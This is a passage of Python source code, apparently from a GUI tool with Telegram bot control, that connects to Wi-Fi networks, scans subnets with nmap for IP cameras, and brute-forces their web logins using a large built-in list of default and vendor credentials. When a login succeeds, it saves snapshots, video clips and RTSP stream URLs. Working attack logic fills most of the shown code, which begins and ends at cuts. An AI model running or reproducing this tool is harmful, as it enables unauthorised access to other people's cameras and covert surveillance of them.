                    
                    success = start_telegram_bot(selected)
                    
                    
                    self.window.after(0, lambda: progress_window.destroy())
                    self.window.after(0, lambda: self.window.destroy())
                    
                    if success:
                        self.window.after(0, lambda: log(f"[+] Successfully started Telegram bot with configuration: {selected}"))
                    else:
                        self.window.after(0, lambda: log(f"[!] Failed to start Telegram bot with configuration: {selected}"))
                        
                except Exception as e:
                    self.window.after(0, lambda: log(f"[!] Error starting Telegram bot: {e}"))
                    self.window.after(0, lambda: progress_window.destroy())
                    self.window.after(0, lambda: self.window.destroy())
                    
            threading.Thread(target=start_bot_thread, daemon=True).start()
        else:
            messagebox.showinfo("Info", "Please select a valid configuration")
    
    def on_close(self):
        """Handle window close event to prevent hangs"""
        try:
            
            self.is_closing = True
            
            
            if hasattr(self, 'update_job') and self.update_job:
                self.window.after_cancel(self.update_job)
                
            
            log("[*] Telegram config window closed - bot will continue running")
            
            
            self.window.after(300, self.complete_close)
        except Exception as e:
            log(f"[!] Error during Telegram config close: {e}")
            
            try:
                self.window.destroy()
            except:
                pass
    
    def complete_close(self):
        """Complete the window closing process"""
        
       
        
        
        try:
            self.window.destroy()
        except:
            pass
    
    

    def update_log(self):
        """Update log display with bot output including errors with enhanced handling"""
        global active_bot_process
        
        
        if self.is_closing:
            return
            
        if active_bot_process:
            
            if not hasattr(self, 'log_text') or not self.log_text.winfo_exists():
                return
            
            
            if active_bot_process.poll() is None:
                
                try:
                    
                    from select import select
                    if active_bot_process.stdout in select([active_bot_process.stdout], [], [], 0)[0]:
                        output = active_bot_process.stdout.readline()
                        if output:
                            self.log_text.insert(tk.END, f"{output}\n")
                            self.log_text.see(tk.END)
                            
                            log(f"[BOT] {output.strip()}")
                except Exception as e:
                    self.log_text.insert(tk.END, f"[Error reading stdout: {str(e)}]\n")
                    
                
                try:
                    from select import select
                    if active_bot_process.stderr in select([active_bot_process.stderr], [], [], 0)[0]:
                        error = active_bot_process.stderr.readline()
                        if error:
                            self.log_text.insert(tk.END, f"ERROR: {error}\n")
                            self.log_text.see(tk.END)
                            
                            log(f"[BOT ERROR] {error.strip()}")
                except Exception as e:
                    self.log_text.insert(tk.END, f"[Error reading stderr: {str(e)}]\n")
            else:
                
                try:
                    stdout, stderr = active_bot_process.communicate(timeout=0.1)
                    if stdout:
                        self.log_text.insert(tk.END, f"{stdout}\n")
                    if stderr:
                        self.log_text.insert(tk.END, f"ERROR: {stderr}\n")
                    self.log_text.see(tk.END)
                    
                    
                    self.log_text.insert(tk.END, f"[!] Bot process exited with code {active_bot_process.returncode}\n")
                    self.log_text.see(tk.END)
                    
                    
                    active_bot_process = None
                except:
                    pass
        
        
        if not self.is_closing and self.window.winfo_exists():
            self.update_job = self.window.after(100, self.update_log)

    

    def save_field_history(self, field_name, value):
        """Save a value to field history"""
        if not value:
            return
            
        history = self.get_field_history(field_name)
        
        
        if value not in history:
            history.insert(0, value)
        else:
            
            history.remove(value)
            history.insert(0, value)
        
        
        history = history[:10]
        
        
        history_file = f"telegram_{field_name}_history.txt"
        try:
            with open(history_file, 'w') as f:
                for item in history:
                    f.write(f"{item}\n")
        except Exception as e:
            log(f"[!] Error saving history for {field_name}: {e}")

    def get_field_history(self, field_name):
        """Get history values for a specific field"""
        history_file = f"telegram_{field_name}_history.txt"
        history = []
        try:
            if os.path.exists(history_file):
                with open(history_file, 'r') as f:
                    history = [line.strip() for line in f.readlines()]
        except Exception as e:
            log(f"[!] Error loading history for {field_name}: {e}")
        return history

SAVE_VIDEO = True
VIDEO_DURATION = 10


log_output = ""
stop_event = Event()
successful_streams = {}  
router_ips = set()  
known_routers = ["192.168.0.1", "192.168.1.1", "10.0.0.1", "192.168.0.254", "192.168.1.254"]
potential_camera_ips = set()  
current_viewer = None  


CAMERA_PORTS = [
    80,    
    443,   
    554,   
    8000,  
    8080,  
    8081,  
    8554,  
    9000,  
    9001,
    37777, 
    34567, 
    37778,
    37779,
    7001,  
    9999,  
    6000,  
    88,    
    5000,  
    3000   
]


CAMERA_SIGNATURES = [
    "camera", "webcam", "ipcam", "netcam", "rtsp", "streaming", 
    "hikvision", "dahua", "axis", "avigilon", "mobotix", "vivotek", 
    "amcrest", "foscam", "ubiquiti", "unifi", "reolink", "tp-link",
    "onvif", "dlink", "camera server", "cctv", "surveillance", "dvr", "nvr"
]


CAMERA_PORTS = [
    
    80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 
    443, 444, 8000, 8001, 8002, 8008, 8009, 8010, 8080, 8081, 8082,
    8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8091, 8099,
    8181, 8443, 8800, 8888, 8889, 8899, 9000, 9001, 9002, 9003,
    9080, 9090, 9099, 9100, 9999,
    
    
    554, 555, 1935, 5000, 5001, 5554, 6554, 7001, 7070, 7443,
    8554, 8555, 9554, 10554, 11554,
    
    
    37777, 37778, 37779,  
    34567, 34568, 34599,  
    3000, 3001, 4000,     
    8000, 8200,           
    9000, 9001, 9002,     
    2000, 2001,           
    7080,                 
    7999, 8111, 8686,     
    91, 92, 95, 99,       
    5050, 6060, 7000,     
    3478, 5000, 5080, 7000, 
    8123, 8843,           
    7547, 8291,           
    5001, 5050, 6000, 6001, 
    6036, 8100, 48080,    
    20000, 20001, 20002,  
    13000, 19000, 19001,  
    21000, 21001, 22220,  
    50000, 55000, 55555,  
    60001, 60002          
]


CAMERA_SIGNATURES = [
    
    "hikvision", "dahua", "axis", "mobotix", "vivotek", "avigilon", "geovision", 
    "bosch", "honeywell", "panasonic", "sony", "samsung", "hanwha", "toshiba", "canon", "jvc",
    "pelco", "lorex", "swann", "amcrest", "foscam", "wanscam", "reolink", "tp-link camera",
    "d-link", "ubiquiti", "unifi", "wyze", "arlo", "nest", "ring", "ezviz", "annke", 
    "zosi", "trendnet", "ubiquiti", "anran", "sricam", "eufy", "yoosee", "escam",
    "uniview", "hipcam", "avtech", "arecont", "brickcom", "grandstream", 
    "jovision", "geovisional", "tiandy", "xm", "besder", "imou", "tapo", "ctronics", 
    "floureon", "gw", "kkmoon", "finetechip", "jennov", "zavio", "messoa", 
    "cantonk", "vstarcam", "ganz", "videoiq", "dcs-", "ipc-", "ipvm", "onvif",
    "gw security", "hosafe", "sunba", "tmezon", "toupcam", "jovision", "milesight",
    "minolta", "dericam", "vacron", "zmodo", "defender", "topsee", "spc", "xiaoyi",
    "bw", "wanview", "raysharp", "iegeek", "besder", "gazer", "digiguard", "iomega",
    "lg", "wireless-n", "vstarcam", "logo_2", "sunell", "sanan", "fine", "lumen",
    "stardot", "tiandy", "cp plus", "videosec", "ruision", "lilin", "provision-isr",
    "n-net", "sunell", "cpone", "infinias", "alarm", "acti", "basler", "3xlogic",
    "starvedia", "bcdvideo", "surveon", "alarmnet", "streamvid", "bomix", "qnap", "synology",
    
    
    "camera", "webcam", "ipcam", "netcam", "ip camera", "network camera", "cctv",
    "surveillance", "security camera", "dvr", "nvr", "video recorder", "video server",
    "ptz", "dome camera", "bullet camera", "wifi camera", "wireless camera", "spy camera",
    "hidden camera", "fisheye", "360 camera", "pinhole camera", "mini camera", 
    "outdoor camera", "indoor camera", "night vision", "ir camera", "thermal camera",
    "streaming camera", "network video", "ip video", "video device", "cloud camera", 
    "home surveillance", "security surveillance", "rtsp server", "stream server", 
    "video encoder", "video decoder", "video device", "surveillance system", 
    "monitoring system", "security dvr", "cctv system", "surveillance device",
    
    
    "webview", "livecam", "cameraweb", "webcamxp", "monitor", "camera viewer",
    "live view", "device web server", "camera stream", "camera admin",
    "camera portal", "video portal", "cloud camera", "network video",
    "web camera", "camera interface", "cam server", "camera module",
    "video management", "camera management", "video surveillance",
    "camera service", "video service", "isp", "isp web", "webcamera",
    "camera login", "security center", "smart surveillance", "ip viewer",
    "video station", "videostation", "monitoring", "dvr login", "video login",
    
    
    "dcs-", "ipc-", "sm-", "ds-", "fd-", "pz-", "cb-", "tv-ip", "wv-",
    "sn-", "cc-", "hc-", "ip-", "cd-", "fv-", "hd-", "cam-", "vi-", 
    "dl-", "nc-", "bs-", "zc-", "model", "streamcam", "onvif", "snc-",
    "nvr", "dvr", "ndr", "hdr", "xvr", "ivr", "camera system",
    "ipod", "kestrel", "resolution", "channel", "megapixel",
    "ch4", "ch8", "ch16", "ch32", "network video recorder",
    "digital video recorder", "recording", "ahd", "tvi", "cvi",
    "analog", "hybrid", "standalone", "motion detect", "alarm record"
]


CREDENTIALS = [
    
    ("admin", "admin"), ("admin", ""), ("root", "root"), ("user", "user"),
    ("admin", "password"), ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
    ("admin", "pass"), ("admin", "Admin123"), ("admin", "admin123"), ("admin", "Admin@123"),
    ("admin", "administrator"), ("admin", "123"), ("admin", "1111"), ("admin", "0000"),
    ("root", ""), ("root", "pass"), ("root", "password"), ("root", "123"),
    ("root", "1234"), ("root", "12345"), ("root", "123456"),
    ("user", ""), ("user", "pass"), ("user", "password"), ("user", "123"),
    ("user", "1234"), ("user", "12345"), ("user", "123456"),
    ("guest", ""), ("guest", "guest"), ("guest", "123"), ("guest", "1234"),
    ("admin", "operator"),
    
    
    ("admin", "12345"), ("admin", "888888"), ("admin", "54321"), ("admin", "00000000"),
    ("admin", "4321"), ("admin", "9999"), ("admin", "A1B2C3D4"), ("admin", "abc123"),
    ("admin", "admin1"), ("admin", "adminadmin"), ("admin", "camera"), ("admin", "system"),
    ("admin", "8888"), ("admin", "9999"), ("admin", "meinsm"), ("admin", "111111"),
    ("admin", "666666"), ("admin", "camera123"), ("admin", "camera1"),
    ("service", "service"), ("supervisor", "supervisor"), ("security", "security"),
    ("installer", "installer"), ("666666", "666666"), ("888888", "888888"), 
    ("default", "default"), ("default", ""), ("system", "system"),
    ("service", ""), ("supervisor", ""), ("administrator", ""), ("operator", ""),
    ("operator", "operator"), ("support", "support"), ("tech", "tech"),
    
    
    ("root", "pass"), ("admin", "admin1234"), ("admin", "pass"), ("root", "admin"),
    ("operator", "operator"), ("viewer", "viewer"), ("root", "admin123"),
    
    
    ("admin", "admin1"), ("admin", "sony"), ("admin", "admin2"),
    
    
    ("888888", "888888"), ("666666", "666666"), ("admin", "admin123"), ("admin", "1234567890"),
    ("admin", "admintelecom"), ("admin", "smcadmin"), ("admin", "1111111"), ("admin", "jvc"),
    
    
    ("admin", "12345"), ("admin", "hikadmin"), ("admin", "hik12345"), ("admin", "hikvision"),
    ("admin", "admin12345"), ("admin", "adminHik"), ("admin", "hk123456"), ("hikuser", "hikpassword"),
    
    
    ("admin", "tlJwpbo6"), ("admin", "123456789"), ("admin", "avtech"), ("admin", "fliradmin"),
    ("admin", "ubnt"), ("Admin", "1234"), ("Admin", "12345"), ("Admin", "123456"),
    ("root", "vizxv"), ("root", "519070"), ("root", "7ujMko0"), ("root", "7ujMko0admin"),
    ("root", "dreambox"), ("root", "GM8182"), ("root", "ikwb"), ("root", "pass1234"),
    ("admin", "aquario"), ("admin", "bosch"), ("admin", "dahua"), ("admin", "jvc"),
    ("admin", "meinsm"), ("admin", "motorola"), ("admin", "samsung"), ("admin", "vertex"),
    ("admin", "vivotek"), ("admin", "1988"), ("admin", "easyaccess"), ("admin", "camera"),
    ("admin", "cambozola"), ("admin", "gmb7823"), ("admin", "vyatta"),
    
    
    ("admin", "tplink"), ("admin", "dlink"), ("admin", "tp-link"), ("admin", "d-link"),
    ("admin", "admintp"), ("admin", "admindl"),
    
    
    ("admin", "foscam"), ("admin", "foscam123"), ("admin", "ipcam"), ("admin", "ipcam123"),
    
    
    ("admin", "DVR2580"), ("admin", "kmx2013"), ("admin", "cat1029"), ("admin", "ls_cps"),
    ("admin", "xvr123456"), ("admin", "nvr123"), ("admin", "nvr123456"),
    
    
    ("admin", "qwerty"), ("admin", "P@ssw0rd"), ("admin", "Welcome"), ("admin", "welcome1"),
    ("admin", "welcome123"), ("admin", "camera123"), ("admin", "cam123"), ("admin", "cctv"),
    ("admin", "monitor"), ("admin", "security"), ("admin", "654321"),
    
    
    ("monitor", "monitor"), ("Admin", "Admin"), ("User", "User"), ("Guest", "Guest"),
    ("demo", "demo"), ("test", "test"), ("manager", "manager"), ("cctv", "cctv"),
    ("super", "super"), ("superadmin", "superadmin"), ("root", "admin1234"),
    ("system", "password"), ("daemon", "daemon"), ("adm", "adm"), ("surveillance", "surveillance"),
    ("viewer", "12345"), ("ipod", "ipod"), ("video", "video"), ("webguest", "1"),
    ("administrator", "123456"), ("administrator", "admin"), 
    ("netadmin", "netadmin"), ("cisco", "cisco"), ("telnet", "telnet"),
    
    
    ("", ""), ("admin", ""), ("root", ""), ("user", "")
]



HTTP_TIMEOUT = 2.5  
MAX_WORKERS = 20   



log_output = ""

def log(msg, single_line=False):
    """Оптимізований лог з запобіганням дублювання"""
    global log_output
    if hasattr(log, 'last_message') and log.last_message == msg:
        return  
        
    
    log.last_message = msg
    
    if not single_line:
        log_output += msg + "\n"
        try:
            if 'output_box' in globals() and output_box and output_box.winfo_exists():
                output_box.insert(tk.END, msg + "\n")
                output_box.see(tk.END)
        except:
            pass
        print(msg)
    else:
        
        print(f"\r{msg}", end="", flush=True)
        try:
            if 'output_box' in globals() and output_box and output_box.winfo_exists():
                
                last_line = output_box.index("end-2c linestart")
                line_text = output_box.get(last_line, "end-1c")
                
                
                if "FPS" in line_text:
                    output_box.delete(last_line, "end-1c")
                    output_box.insert(tk.END, f"{msg}\n")
                else:
                    
                    output_box.insert(tk.END, f"{msg}\n")
                output_box.see(tk.END)
        except:
            pass

def find_open_wifi():
    """Find available Wi-Fi networks"""
    try:
        output = subprocess.check_output(["nmcli", "-f", "SSID,SECURITY", "dev", "wifi"]).decode()
        lines = output.strip().split("\n")[1:]
        ssids = set()
        networks = []
        for line in lines:
            parts = line.strip().split()
            if not parts:
                continue
            ssid = parts[0]
            security = " ".join(parts[1:]) if len(parts) > 1 else "OPEN"
            if ssid not in ssids:
                ssids.add(ssid)
                networks.append((ssid, security))
        return networks
    except Exception as e:
        log(f"[!] Failed to list Wi-Fi: {e}")
        return []

def get_wifi_interface():
    """Get the name of the Wi-Fi interface"""
    try:
        output = subprocess.check_output(["nmcli", "device", "status"]).decode()
        for line in output.splitlines():
            if "wifi" in line:
                return line.split()[0]
    except Exception as e:
        log(f"[!] Failed to get interface: {e}")
    return "wlan0"

def connect_to_wifi(ssid, password="", security=""):
    """Connect to a Wi-Fi network"""
    try:
        log(f"[*] Connecting to: {ssid} | Security: {security}")
        interface = get_wifi_interface()
        subprocess.run(["nmcli", "connection", "delete", ssid], 
                      stdout=subprocess.DEVNULL, 
                      stderr=subprocess.DEVNULL)
        
        if security == "--" or "OPEN" in security.upper():
            subprocess.run(["nmcli", "dev", "wifi", "connect", ssid, "ifname", interface], check=True)
        else:
            args = [
                "nmcli", "connection", "add", "type", "wifi", "con-name", ssid,
                "ifname", interface, "ssid", ssid, "--",
                "wifi-sec.key-mgmt", "wpa-psk", "wifi-sec.psk", password
            ]
            subprocess.run(args, check=True)
            subprocess.run(["nmcli", "connection", "up", ssid], check=True)
        log(f"[+] Connected to {ssid}")
        time.sleep(3)  
    except subprocess.CalledProcessError as e:
        log(f"[!] Connection failed: {e}")

def get_local_subnet():
    """Get the local subnet"""
    try:
        output = subprocess.check_output(["ip", "-4", "addr", "show"]).decode()
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("inet ") and "scope global" in line:
                ip = line.split()[1]  
                return ip
    except Exception as e:
        log(f"[!] Failed to get local subnet: {e}")
    return "192.168.0.0/24"

def get_all_subnets():
    """Get all possible subnets on the local network"""
    subnets = []
    try:
        
        main_subnet = get_local_subnet()
        subnets.append(main_subnet)
        
        
        output = subprocess.check_output(["ip", "route"]).decode()
        for line in output.splitlines():
            parts = line.split()
            if len(parts) > 0 and "/" in parts[0]:
                subnet = parts[0]
                if subnet not in subnets and not subnet.startswith("169.254"):  
                    subnets.append(subnet)
    except Exception as e:
        log(f"[!] Error identifying subnets: {e}")
    
    return subnets

def is_camera_port_open(ip, port):
    """Check if a specific camera-related port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)  
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def identify_camera_ips(subnet):
    """Identify only potential camera IPs, excluding obvious routers"""
    log(f"[*] Identifying camera IPs on subnet {subnet}")
    scanner = nmap.PortScanner()
    try:
        
        port_str = ','.join(map(str, CAMERA_PORTS))
        scanner.scan(hosts=subnet, arguments=f'-p {port_str} --open -T4')
        
        potential_cameras = []
        for host in scanner.all_hosts():
            
            if host in known_routers:
                log(f"[*] Skipping router IP: {host}")
                continue
                
            if 'tcp' in scanner[host]:
                for port in CAMERA_PORTS:
                    if port in scanner[host]['tcp'] and scanner[host]['tcp'][port]['state'] == 'open':
                        potential_cameras.append(host)
                        potential_camera_ips.add(host)
                        log(f"[+] Found device with camera port at {host}:{port}")
                        break
        
        
        if potential_cameras:
            try:
                
                hosts_str = ' '.join(potential_cameras)
                scanner.scan(hosts=hosts_str, arguments='-sV -T4')
                
                
                confirmed_cameras = []
                for host in scanner.all_hosts():
                    if 'tcp' in scanner[host]:
                        for port in scanner[host]['tcp']:
                            service = scanner[host]['tcp'][port]
                            if ('product' in service and any(sig in service['product'].lower() for sig in CAMERA_SIGNATURES)) or \
                               ('name' in service and any(sig in service['name'].lower() for sig in CAMERA_SIGNATURES)):
                                confirmed_cameras.append(host)
                                log(f"[+] Confirmed camera at {host}:{port} - {service.get('product', '')}")
                                break
                
                if confirmed_cameras:
                    log(f"[+] Found {len(confirmed_cameras)} confirmed cameras")
                    return confirmed_cameras
                    
                
                return potential_cameras
            except:
                log("[!] Enhanced service detection failed, using potential camera list")
                return potential_cameras
        
        return potential_cameras
    except Exception as e:
        log(f"[!] Error identifying cameras: {e}")
        return []

def convert_snapshot_to_mp4(snapshot_path, output_path, duration=5):
    """Creates a short MP4 video from a static image (useful for HTTP-only cameras)"""
    try:
        img = cv2.imread(snapshot_path)
        if img is None:
            log(f"[!] Failed to load snapshot for video conversion")
            return False
            
        height, width = img.shape[:2]
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        fps = 5  
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
        
        
        
        for _ in range(duration * fps):
            out.write(img)
            
        out.release()
        log(f"[+] Created {duration}-second video from snapshot: {output_path}")
        return True
    except Exception as e:
        log(f"[!] Error creating video from snapshot: {e}")
        return False

def save_stream(url, filename, auth=None):
    """Save a video stream using ffmpeg with proper argument handling"""
    try:
        args = ["ffmpeg", "-y"]
        
        if auth:
            args.extend(["-auth_type", "basic", "-user", auth[0], "-password", auth[1]])
            
        args.extend(["-i", url, "-t", str(VIDEO_DURATION), 
                   "-vcodec", "copy", "-an", filename])
                   
        subprocess.run(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log(f"[+] Saved video to {filename}")
        return True
    except Exception as e:
        log(f"[!] Failed to save video: {e}")
        return False

def try_http(ip):
    """Try accessing various HTTP paths on an IP camera using plugins"""
    session = requests.Session()
    
    for user, password in [('', '')] + CREDENTIALS:  
        auth = None if user == '' else HTTPBasicAuth(user, password)
        
        for port in [80, 443, 8080, 8081, 8000]:  
            if stop_event.is_set():
                return False
                
            for protocol in ["http", "https"]:
                if port == 443 and protocol == "http":
                    continue  
                    
                
                base_url = f"{protocol}://{ip}:{port}"
                    
                
                vendor = "generic"
                try:
                    vendor = enhance_vendor_detection(session, base_url)
                except:
                    pass
                    
                
                registry = VendorRegistry()
                vendor_plugin = registry.get_vendor_by_name(vendor)
                    
                if not vendor_plugin:
                    vendor_plugin = registry.get_vendor_by_name("generic")
                    
                
                paths_to_try = vendor_plugin.get_paths("photo")
                    
                
                if vendor != "generic":
                    generic_plugin = registry.get_vendor_by_name("generic")
                    if generic_plugin:
                        paths_to_try.extend(generic_plugin.get_paths("photo"))
                    
                for path in paths_to_try:
                    if stop_event.is_set(): 
                        return False
                    
                    url = f"{base_url}{path}"
                    log(f"[~] Trying HTTP snapshot: {url}")
                    
                    try:
                        r = session.get(url, timeout=HTTP_TIMEOUT, auth=auth, verify=False)
                        if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                            filename = f"camera_{ip}_snapshot.jpg"
                            with open(filename, "wb") as f:
                                f.write(r.content)
                            log(f"[✔] HTTP snapshot found: {url}")
                            log(f"[+] Saved snapshot to {filename}")
                            
                            
                            successful_streams[ip] = {
                                'url': url,
                                'type': 'http',
                                'auth': (user, password) if auth else None,
                                'snapshot_path': filename
                            }
                            
                            
                            if 'mjpg' in path.lower() or 'mjpeg' in r.headers.get('Content-Type', '').lower():
                                successful_streams[ip]['type'] = 'mjpeg'
                                log(f"[+] Detected MJPEG stream capability")
                            
                            
                            if SAVE_VIDEO:
                                video_path = f"camera_{ip}_video.mp4"
                                convert_snapshot_to_mp4(filename, video_path)
                            
                            return True
                        
                        
                        elif r.status_code == 200 and ('multipart' in r.headers.get('Content-Type', '').lower()):
                            log(f"[✔] MJPEG stream found: {url}")
                            
                            
                            successful_streams[ip] = {
                                'url': url,
                                'type': 'mjpeg',
                                'auth': (user, password) if auth else None
                            }
                            return True
                            
                    except Exception as e:
                        continue
    
    return False

def check_for_login_page(ip):
    """Check if there's a login page that might indicate a camera web interface using plugins"""
    session = requests.Session()
    
    for port in [80, 443, 8080, 8081, 8000]:
        for protocol in ["http", "https"]:
            if port == 443 and protocol == "http":
                continue
                
            base_url = f"{protocol}://{ip}:{port}/"
            try:
                r = session.get(base_url, timeout=HTTP_TIMEOUT, verify=False)
                if r.status_code == 200 or r.status_code == 401:
                    
                    vendor = detect_camera_vendor(session, base_url)
                    
                    
                    registry = VendorRegistry()
                    vendor_plugin = registry.get_vendor_by_name(vendor)
                    
                    if not vendor_plugin:
                        vendor_plugin = registry.get_vendor_by_name("generic")
                    
                    
                    if vendor_plugin.is_login_page(r):
                        log(f"[+] Знайдено форму логіну камери на {base_url} (виробник: {vendor})")
                        successful_streams[ip] = {
                            'url': base_url,
                            'type': 'web_interface',
                            'auth': None,
                            'note': 'Знайдено форму логіну камери',
                            'vendor': vendor
                        }
                        return True
                    
                    
                    content = r.text.lower()
                    login_indicators = ['login', 'password', 'username', 'auth', 'camera', 'ipcam', 'surveillance']
                    
                    if any(indicator in content for indicator in login_indicators):
                        log(f"[+] Знайдено потенційний веб-інтерфейс камери на {base_url}")
                        successful_streams[ip] = {
                            'url': base_url,
                            'type': 'web_interface',
                            'auth': None,
                            'note': 'Потенційний веб-інтерфейс камери',
                            'vendor': vendor
                        }
                        return True
            except Exception as e:
                
                
                pass
    
    return False

def try_camera_auth(ip, port, protocol):
    """Оновлена функція автентифікації, яка використовує CameraAuthManager"""
    session = requests.Session()
    
    log(f"[*] Тестування підключення до {ip}:{port}")
    
    
    if protocol == "https" and port == 80:
        log(f"[*] Пропуск HTTPS на порті 80")
        return False
    
    base_url = f"{protocol}://{ip}:{port}"
    
    try:
        
        requests.packages.urllib3.disable_warnings()
        
        
        log(f"[*] Спроба доступу до {base_url}")
        r = session.get(f"{base_url}/", timeout=HTTP_TIMEOUT, verify=False, allow_redirects=True)
        
        
        vendor = enhance_vendor_detection(session, base_url)
        if vendor != "generic":
            log(f"[+] Визначено виробника камери: {vendor}")
        
        
        auth_manager = CameraAuthManager(session, ip, port, protocol, vendor)
        
        
        if auth_manager.try_vendor_auth():
            log(f"[+] Успішна автентифікація з використанням виробник-специфічної автентифікації")
            return True
        
        
        if r.status_code == 401:  
            log(f"[*] Камера на {ip}:{port} потребує HTTP Basic аутентифікації")
            log(f"[*] Перебір облікових даних (список містить {len(CREDENTIALS)} комбінацій)")
            
            
            credentials_to_try = []
            
            
            if vendor == "hikvision":
                credentials_to_try.extend([("admin", "12345"), ("admin", "admin12345")])
            elif vendor == "dahua":
                credentials_to_try.extend([("admin", "admin"), ("888888", "888888")])
            elif vendor == "dlink":
                credentials_to_try.extend([("admin", ""), ("admin", "admin"), ("user", "user")])
            
            
            credentials_to_try.extend(CREDENTIALS)
            
            
            unique_credentials = []
            for cred in credentials_to_try:
                if cred not in unique_credentials:
                    unique_credentials.append(cred)
            
            
            auth_attempts = 0
            for user, password in unique_credentials:
                auth_attempts += 1
                if auth_attempts % 10 == 0:  
                    log(f"[*] Перевірено {auth_attempts} комбінацій з {len(unique_credentials)}")
                    
                auth = HTTPBasicAuth(user, password)
                try:
                    auth_url = f"{base_url}/"
                    log(f"[*] Спроба автентифікації з {user}:{password}")
                    
                    r = session.get(auth_url, timeout=HTTP_TIMEOUT, auth=auth, verify=False)
                    if r.status_code == 200:
                        log(f"[+] Успішна автентифікація з {user}:{password}")
                        
                        
                        photo_url = find_photo_url(session, base_url, auth)
                        video_url = find_video_url(session, base_url, auth)
                        
                        if photo_url or video_url:
                            log(f"[+] Знайдено медіа-URL для камери на {ip}")
                            
                            
                            successful_streams[ip] = {
                                'base_url': base_url,
                                'auth': (user, password),
                                'photo_url': photo_url,
                                'video_url': video_url,
                                'vendor': vendor
                            }
                            
                            
                            if photo_url:
                                try:
                                    save_photo(session, photo_url, ip, auth)
                                except Exception as e:
                                    log(f"[!] Помилка збереження знімка: {e}")
                            
                            
                            rtsp_url = check_rtsp_url(ip, (user, password))
                            if rtsp_url:
                                log(f"[+] Знайдено RTSP URL: {rtsp_url}")
                                successful_streams[ip]['rtsp_url'] = rtsp_url
                            
                            return True
                        else:
                            log(f"[!] Аутентифікація успішна, але не знайдено медіа URL")
                except Exception as e:
                    log(f"[!] Помилка при спробі автентифікації: {str(e)[:50]}")
                    continue
            
            log(f"[!] Перебрано всі {len(unique_credentials)} комбінацій, доступ не отримано")
        
        
        elif r.status_code == 200:
            if "login" in r.text.lower() or "password" in r.text.lower():
                log(f"[*] Виявлено форму авторизації на {ip}:{port}")
                
                
                log(f"[*] Спроба загальної форм-автентифікації")
                form_auth_success = try_form_auth(session, base_url, vendor)
                if form_auth_success:
                    return True
                
                log(f"[!] Форм-автентифікація не вдалася")
            else:
                
                log(f"[*] Камера на {ip}:{port} не потребує автентифікації")
                
                
                photo_url = find_photo_url(session, base_url, None)
                video_url = find_video_url(session, base_url, None)
                
                if photo_url or video_url:
                    log(f"[+] Знайдено медіа-URL для камери на {ip}")
                    
                    
                    successful_streams[ip] = {
                        'base_url': base_url,
                        'auth': None,
                        'photo_url': photo_url,
                        'video_url': video_url,
                        'vendor': vendor
                    }
                    
                    
                    if photo_url:
                        try:
                            save_photo(session, photo_url, ip, None)
                        except Exception as e:
                            log(f"[!] Помилка збереження знімка: {e}")
                    
                    return True
        else:
            log(f"[!] Отримано непередбачуваний статус-код: {r.status_code}")
    
    except Exception as e:
        log(f"[!] Помилка доступу до камери: {str(e)}")
    
    return False

def try_form_auth(session, base_url, vendor):
    """Спробувати авторизацію через форму логіну"""
    
    credentials_to_try = []
    
    if vendor == "hikvision":
        credentials_to_try.extend([("admin", "12345"), ("admin", "admin12345")])
    elif vendor == "dahua":
        credentials_to_try.extend([("admin", "admin"), ("888888", "888888")])
    elif vendor == "dlink":
        credentials_to_try.extend([("admin", ""), ("admin", "admin"), ("user", "user")])
    elif vendor == "foscam":
        credentials_to_try.extend([("admin", ""), ("admin", "admin")])
    
    
    credentials_to_try.extend(CREDENTIALS[:20])
    
    
    login_forms_by_vendor = {
        "hikvision": [
            {"username": "{user}", "password": "{pass}"},
            {"user": "{user}", "pass": "{pass}"}
        ],
        "dahua": [
            {"username": "{user}", "password": "{pass}"},
            {"user": "{user}", "password": "{pass}"}
        ],
        "dlink": [
            {"user": "{user}", "pwd": "{pass}"},
            {"username": "{user}", "password": "{pass}"}
        ],
        "foscam": [
            {"user": "{user}", "pwd": "{pass}"},
            {"loginUser": "{user}", "loginPass": "{pass}"}
        ],
        "generic": [
            {"username": "{user}", "password": "{pass}"},
            {"user": "{user}", "pwd": "{pass}"},
            {"name": "{user}", "pass": "{pass}"},
            {"account": "{user}", "passwd": "{pass}"},
            {"login": "{user}", "password": "{pass}"}
        ]
    }
    
    
    forms_to_try = []
    if vendor in login_forms_by_vendor:
        forms_to_try.extend(login_forms_by_vendor[vendor])
    forms_to_try.extend(login_forms_by_vendor["generic"])
    
    
    login_paths = [
        "/login.cgi", "/login", "/Login", "/cgi-bin/login", 
        "/auth", "/authenticate", "/cgi/login", "/form-login",
        "/dologin", "/doLogin", "/loginform", "/loginForm",
        "/cgi-bin/auth.cgi", "/authorize", "/web/login"
    ]
    
    
    for user, password in credentials_to_try:
        for form_template in forms_to_try:
            
            form_data = {}
            for key, value_template in form_template.items():
                form_data[key] = value_template.replace("{user}", user).replace("{pass}", password)
            
            for path in login_paths:
                try:
                    login_url = f"{base_url}{path}"
                    
                    
                    login_response = session.post(
                        login_url, 
                        data=form_data,
                        timeout=HTTP_TIMEOUT, 
                        verify=False,
                        allow_redirects=True
                    )
                    
                    
                    if login_response.status_code == 200:
                        
                        test_response = session.get(f"{base_url}/", 
                                                  timeout=HTTP_TIMEOUT, 
                                                  verify=False)
                        
                        if "login" not in test_response.text.lower() or "password" not in test_response.text.lower():
                            log(f"[+] Успішна форм-автентифікація з {user}:{password}")
                            
                            
                            photo_url = find_photo_url(session, base_url, None)
                            video_url = find_video_url(session, base_url, None)
                            
                            if photo_url or video_url:
                                log(f"[+] Знайдено медіа-URL для камери з форм-авторизацією")
                                
                                
                                ip = base_url.split("://")[1].split(":")[0]
                                successful_streams[ip] = {
                                    'base_url': base_url,
                                    'auth': (user, password),
                                    'auth_type': 'form',
                                    'photo_url': photo_url,
                                    'video_url': video_url,
                                    'vendor': vendor,
                                    'cookies': dict(session.cookies)
                                }
                                
                                
                                if photo_url:
                                    try:
                                        save_photo(session, photo_url, ip, None)
                                    except Exception as e:
                                        log(f"[!] Помилка збереження знімка форм-авторизації: {e}")
                                
                                return True
